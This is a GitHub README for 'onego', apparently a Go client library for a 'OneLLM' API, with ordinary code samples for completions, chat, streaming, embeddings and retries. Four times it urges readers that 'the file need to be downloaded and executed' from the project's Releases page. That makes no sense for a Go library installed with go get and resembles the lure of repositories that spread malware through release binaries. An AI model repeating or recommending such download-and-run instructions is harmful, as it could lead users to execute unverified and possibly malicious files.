[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github&style=for-the-badge)](https://github.com/ATLewin/onego/releases)

# onego — Go client for OneLLM API | Fast LLM integrations

![Go Gopher](https://raw.githubusercontent.com/golang/go/master/doc/gopher/gopher.png)  
![AI Illustration](https://img.shields.io/badge/AI-LLM-brightgreen)

onego is a Go library that wraps the OneLLM REST API. Use it to call models such as ChatGPT, Claude, Gemini, Mistral, or DeepSeek from Go apps. The library focuses on a clean API, simple configuration, streaming support, and provider-agnostic calls.

Badges
- Topics: ai, api, artificial-intelligence, chatgpt, claude, gemini, mistral, llm, onellm, rest-api, saas  
- Build, license and release badges available on the repo.

Quick links
- Releases: https://github.com/ATLewin/onego/releases  
  Download the release file from the link above. The file need to be downloaded and executed.  
- Release button: [![Download Release](https://img.shields.io/badge/Download-Release-blue?logo=github&style=for-the-badge)](https://github.com/ATLewin/onego/releases)

Table of contents
- Features
- Install
- Download binary (Releases)
- Quickstart
- Examples
  - Simple completion
  - Chat completion
  - Streaming responses
- Configuration
- Error handling
- Tests
- Contributing
- License
- FAQ
- Changelog

Features
- Small, typed Go client for OneLLM REST endpoints.
- Provider-agnostic requests: choose model name or provider tag.
- Synchronous and streaming responses.
- Context support for cancelation and timeouts.
- Simple structs for requests and responses.
- Support for text, chat, embeddings, and file uploads.
- Works with Go modules.

Install

Use Go modules:

go get github.com/ATLewin/onego

Or add the module to your go.mod:

require github.com/ATLewin/onego v0.0.0

Build from source:

git clone https://github.com/ATLewin/onego.git
cd onego
go build ./...

Download binary (Releases)

Visit the Releases page and pick the asset for your OS and architecture: https://github.com/ATLewin/onego/releases. The file need to be downloaded and executed. Releases include prebuilt binaries and tarballs with checksums. Use the binary for command-line calls or to inspect the raw HTTP interactions.

If the releases link fails, check the "Releases" section on the repository page in GitHub.

Configuration

onego reads configuration from environment variables or a config struct.

Environment variables
- ONE_LLM_API_KEY — your OneLLM API key
- ONE_LLM_BASE_URL — optional base URL (defaults to https://api.onellm.com)
- ONE_LLM_TIMEOUT — request timeout in seconds

Programmatic config

type Config struct {
    APIKey  string
    BaseURL string
    Timeout time.Duration
}

client, err := onego.New(onego.Config{
    APIKey:  os.Getenv("ONE_LLM_API_KEY"),
    BaseURL: "https://api.onellm.com",
    Timeout: 30 * time.Second,
})

Quickstart

Simple completion example. This example calls the text completion endpoint and returns the top text.

import (
    "context"
    "fmt"
    "os"
    "time"

    "github.com/ATLewin/onego"
)

func main() {
    apiKey := os.Getenv("ONE_LLM_API_KEY")
    client, err := onego.New(onego.Config{
        APIKey:  apiKey,
        Timeout: 15 * time.Second,
    })
    if err != nil {
        panic(err)
    }

    req := onego.CompletionRequest{
        Model:  "gpt-4o-mini",
        Prompt: "Write a short Go function that reverses a string.",
        MaxTokens: 150,
        Temperature: 0.2,
    }

    ctx := context.Background()
    resp, err := client.Completions.Create(ctx, req)
    if err != nil {
        panic(err)
    }

    fmt.Println(resp.Text)
}

Chat completion example

The client supports chat-style requests with role-based messages.

messages := []onego.ChatMessage{
    {Role: "system", Content: "You are a helpful assistant."},
    {Role: "user", Content: "Explain WebAssembly in plain terms."},
}

chatReq := onego.ChatRequest{
    Model:    "claude-2",
    Messages: messages,
    MaxTokens: 300,
}

chatResp, err := client.Chat.Create(ctx, chatReq)
if err != nil {
    // handle error
}
fmt.Println(chatResp.Choices[0].Message.Content)

Streaming responses

onego supports streaming using HTTP chunked transfer or server-sent events. The client exposes a Stream method that returns a channel. Use context to cancel.

streamReq := onego.CompletionRequest{
    Model: "mistral-stream",
    Prompt: "Write an outline for a technical blog post about Go routines.",
    MaxTokens: 400,
    Stream: true,
}

ch, err := client.Completions.Stream(ctx, streamReq)
if err != nil {
    panic(err)
}

for chunk := range ch {
    if chunk.Error != nil {
        fmt.Println("stream error:", chunk.Error)
        break
    }
    fmt.Print(chunk.Text)
}

API design and types

The library uses simple typed structs:

- CompletionRequest
  - Model string
  - Prompt string
  - MaxTokens int
  - Temperature float32
  - Stream bool

- CompletionResponse
  - ID string
  - Text string
  - TokensUsed int

- ChatRequest
  - Model string
  - Messages []ChatMessage

- ChatMessage
  - Role string ("system"|"user"|"assistant")
  - Content string

- EmbeddingRequest
  - Model string
  - Input []string

- EmbeddingResponse
  - Vectors [][]float32

Error handling

onego returns typed errors with HTTP status and API error payload. Use errors.Is to detect context cancellation and network errors.

if errors.Is(err, context.Canceled) {
    // request cancelled
}

if apiErr, ok := err.(onego.APIError); ok {
    fmt.Printf("API error: %d %s\n", apiErr.StatusCode, apiErr.Message)
}

Rate limits and retries

onego includes a small retry helper. It retries on 429 or 5xx by default. Configure retry via client options.

client.SetRetryPolicy(onego.RetryPolicy{
    MaxAttempts: 3,
    Backoff:     onego.ExponentialBackoff(500*time.Millisecond, 5*time.Second),
})

Logging

The client accepts an io.Writer for debug logs. Keep logs off in production.

client.SetLogger(os.Stderr)

Testing

Run unit tests with:

go test ./...

Integration tests require an API key. Export ONE_LLM_API_KEY and run:

ONE_LLM_API_KEY=sk-... go test ./... -run Integration

Use VCR or HTTP mock libraries to record responses and avoid hitting the real API on every test.

Contributing

- Fork the repo
- Create a feature branch
- Run go fmt and go vet
- Add tests for new features
- Open a pull request describing the change and use cases

Follow the repository code style. Keep functions small and focused. Use context for request control.

Security

Store API keys in secure stores and not in source. Use environment variables or secrets managers. Rotate keys as needed.

Examples of provider selection

The client treats model names as the primary selector. OneLLM maps model names to providers. You may pass provider hints in the request metadata:

req.Meta = map[string]string{"provider":"openai"}

Embeddings example

embReq := onego.EmbeddingRequest{
    Model: "text-embedding-3-small",
    Input: []string{"Compute vector for this sentence."},
}

embResp, err := client.Embeddings.Create(ctx, embReq)
if err != nil {
    // handle
}
fmt.Printf("Embedding size: %d\n", len(embResp.Vectors[0]))

Files and uploads

Uploads use multipart/form-data. Use the Files API to upload and reference files for fine-tuning or retrieval.

cli := client.Files
fileID, err := cli.Upload(ctx, "/path/to/dataset.jsonl")
if err != nil {
    // handle
}

Command-line tool

The repository can include a small CLI wrapper around the client. Use the prebuilt releases for the CLI.

Changelog and Releases

Check releases here: https://github.com/ATLewin/onego/releases. The file need to be downloaded and executed. Releases list breaking changes and migration notes.

License

The project uses the MIT License. See the LICENSE file.

FAQ

Q: Which models work with onego?
A: Any model exposed by OneLLM. Use model names such as `gpt-4o-mini`, `claude-2`, `gemini-pro`, `mistral-large`.

Q: Does onego support streaming?
A: Yes. Use the `Stream: true` flag and the Stream method to receive chunks.

Q: How do I handle rate limits?
A: Use the built-in retry policy, respect Retry-After headers, and back off on 429.

Q: Can I use custom base URLs?
A: Yes. Set `BaseURL` in Config or the `ONE_LLM_BASE_URL` env var.

Maintainer notes

- Keep the API surface stable for common patterns.
- Add helper functions for repeated tasks such as prompt templating.
- Keep network calls testable and mockable.

Resources and links
- Releases: https://github.com/ATLewin/onego/releases  
- Project repository: https://github.com/ATLewin/onego
- OneLLM docs (example): https://docs.onellm.com

Images and assets
- Go gopher: https://raw.githubusercontent.com/golang/go/master/doc/gopher/gopher.png
- GitHub badges: https://img.shields.io

Security report
If you find a security issue, open a private issue or use the repository security contact. Provide steps to reproduce and minimal code to trigger the issue.

Changelog
Maintain a changelog in CHANGELOG.md. Note breaking changes and upgrade steps. Use semantic versioning.

Contact
Open issues on GitHub for bugs, feature requests, or questions. Use pull requests for code contributions.

License and attribution
MIT license applies to the code. Third-party logos and assets follow their respective licenses.